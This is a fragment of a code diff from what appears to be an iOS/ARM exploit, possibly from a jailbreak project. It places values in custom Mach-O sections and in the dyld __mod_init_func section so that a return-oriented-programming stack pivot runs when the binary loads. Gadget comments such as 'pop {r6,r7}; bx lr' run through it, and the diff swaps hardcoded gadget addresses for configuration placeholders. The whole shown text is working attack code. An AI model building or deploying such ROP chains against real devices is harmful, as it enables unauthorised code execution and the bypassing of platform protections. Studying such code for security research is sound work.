@@ -12,19 +12,10 @@ char* execve_params[];
 
 //we need a return 0 gadget at offset 0x78 in __TEXT so the second initializer is called
 //also our first initializer poped 2 dword so locals are shifted around
-/*
-static int __attribute__((constructor)) bing(){};
-static int __attribute__((constructor)) bong(){};
-*/
-//0x3000E2F1 XXX
-/*0x3117e1a0,   // a0 e1 17 31 89 b5 e0 2f
-0x2FE0B588 + 1,*/   //89 b5 e0 2f
 //LOL must be at 0x1000
-//unsigned int __attribute__((section("__LOL,__lol"))) lol[2]={0x1,0x2FE0B588+1}; //second initalizer = stack pivot
 unsigned int __attribute__((section("__LOL,__lol"))) lol[2]={0x1,CONFIG_K103}; //second initalizer = stack pivot
 
 //=> R7=myROPStack but we need to have dyld loop another time without crahsing, next initializer is in lol[2]
-//struct stack __attribute__((section("__ROP,__rop"))) myROPStack={
 unsigned int __attribute__((section("__DATA,__mod_init_func"))) myROPStack[0x1000]={
         CONFIG_K101,//0x3117E1A0,                     //pop {r6,r7}; bx lr
         CONFIG_K11,                     //pop {r4-r7, pc}
